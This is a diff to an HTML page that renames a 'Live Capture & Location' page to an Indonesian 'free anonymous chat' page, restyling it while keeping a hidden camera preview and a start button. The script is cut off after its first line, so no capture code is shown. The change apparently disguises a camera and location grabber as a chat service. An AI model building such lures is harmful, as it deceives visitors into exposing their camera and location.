@@ -3,63 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Capture & Location</title>
+    <title>Chat Gratis Tanda Identitas</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #000;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            color: #0f0;
-            overflow: hidden;
-        }
-        #preview {
-            width: 100%;
-            height: 60vh;
-            object-fit: cover;
-            border: 2px solid #0f0;
-            display: none;
-        }
-        #startBtn {
-            padding: 15px 30px;
-            background: #0f0;
-            color: #000;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 18px;
-            margin-top: 20px;
-            z-index: 10;
-        }
-        #status {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #fff;
-        }
-        .loading {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0f0;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-left: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    :root {
+        --bg: #0b1020;
+        --panel: rgba(17, 24, 39, .78);
+        --panel-border: rgba(255,255,255,.10);
+        --text: #f8fafc;
+        --muted: #94a3b8;
+        --accent: #6366f1;
+        --accent-2: #8b5cf6;
+        --success: #22c55e;
+        --danger: #ef4444;
+        --shadow: 0 24px 80px rgba(0,0,0,.45);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+        margin: 0;
+        padding: 24px;
+        min-height: 100vh;
+        background:
+            radial-gradient(circle at 15% 15%, rgba(99,102,241,.18), transparent 30%),
+            radial-gradient(circle at 85% 85%, rgba(139,92,246,.16), transparent 30%),
+            var(--bg);
+        color: var(--text);
+        font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: auto;
+    }
+
+    body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        pointer-events: none;
+        background-image: linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
+                          linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
+        background-size: 32px 32px;
+        mask-image: linear-gradient(to bottom, black, transparent 90%);
+    }
+
+    .app-shell {
+        width: min(760px, 100%);
+        position: relative;
+    }
+
+    .card {
+        padding: clamp(22px, 5vw, 42px);
+        border: 1px solid var(--panel-border);
+        border-radius: 28px;
+        background: var(--panel);
+        backdrop-filter: blur(22px);
+        -webkit-backdrop-filter: blur(22px);
+        box-shadow: var(--shadow);
+    }
+
+    .brand {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 28px;
+    }
+
+    .brand-icon {
+        width: 48px;
+        height: 48px;
+        display: grid;
+        place-items: center;
+        border-radius: 15px;
+        background: linear-gradient(135deg, var(--accent), var(--accent-2));
+        box-shadow: 0 10px 30px rgba(99,102,241,.28);
+        font-size: 22px;
+    }
+
+    .brand h1 {
+        margin: 0;
+        font-size: clamp(22px, 4vw, 30px);
+        letter-spacing: -.03em;
+    }
+
+    .brand p {
+        margin: 4px 0 0;
+        color: var(--muted);
+        font-size: 13px;
+    }
+
+    .preview-wrap {
+        position: relative;
+        overflow: hidden;
+        border-radius: 20px;
+        background: #020617;
+        border: 1px solid rgba(255,255,255,.09);
+    }
+
+    #preview {
+        width: 100%;
+        max-height: 62vh;
+        aspect-ratio: 16 / 10;
+        object-fit: cover;
+        border: 0;
+        display: none;
+        background: #020617;
+    }
+
+    .status-box {
+        min-height: 52px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        margin-top: 18px;
+        padding: 14px 16px;
+        border: 1px solid rgba(255,255,255,.08);
+        border-radius: 14px;
+        background: rgba(2,6,23,.45);
+        color: var(--muted);
+        font-size: 14px;
+        text-align: center;
+    }
+
+    #status {
+        margin: 0;
+        color: inherit;
+    }
+
+    #startBtn {
+        width: 100%;
+        margin-top: 18px;
+        padding: 15px 22px;
+        border: 0;
+        border-radius: 14px;
+        background: linear-gradient(135deg, var(--accent), var(--accent-2));
+        color: white;
+        font-size: 15px;
+        font-weight: 700;
+        letter-spacing: .01em;
+        cursor: pointer;
+        box-shadow: 0 12px 28px rgba(99,102,241,.25);
+        transition: transform .18s ease, box-shadow .18s ease, opacity .18s ease;
+    }
+
+    #startBtn:hover:not(:disabled) {
+        transform: translateY(-2px);
+        box-shadow: 0 16px 34px rgba(99,102,241,.34);
+    }
+
+    #startBtn:active:not(:disabled) {
+        transform: translateY(0);
+    }
+
+    #startBtn:disabled {
+        cursor: not-allowed;
+        opacity: .55;
+        box-shadow: none;
+    }
+
+    .loading {
+        width: 16px;
+        height: 16px;
+        margin-left: 2px;
+        border: 2px solid rgba(255,255,255,.22);
+        border-top-color: #fff;
+        border-radius: 50%;
+        display: inline-block;
+        vertical-align: middle;
+        animation: spin .8s linear infinite;
+    }
+
+    .footer-note {
+        margin-top: 18px;
+        color: #64748b;
+        font-size: 12px;
+        text-align: center;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 600px) {
+        body { padding: 12px; }
+        .card { border-radius: 22px; padding: 20px; }
+        .brand { margin-bottom: 22px; }
+        #preview { aspect-ratio: 4 / 3; max-height: 55vh; }
+    }
+</style>
 </head>
 <body>
 
-    <img id="preview" alt="Preview Kamera">
-    <div id="status">Tap tombol untuk mulai</div>
-    <button id="startBtn">Anonymous Chat</button>
+    <main class="app-shell">
+        <section class="card">
+            <header class="brand">
+                <div class="brand-icon">✦</div>
+                <div>
+                    <h1>Anonymous Chat</h1>
+                    <p>Mulai Sekarang</p>
+                </div>
+            </header>
+
+            <div class="preview-wrap">
+                <img id="preview" alt="Preview Kamera">
+            </div>
+
+            <div class="status-box">
+                <div id="status">Tap tombol untuk mulai</div>
+            </div>
+
+            <button id="startBtn">Mulai</button>
+
+            <div class="footer-note">Gratis Untuk Di Gunakan.</div>
+        </section>
+    </main>
 
     <script>
         const btn = document.getElementById('startBtn');
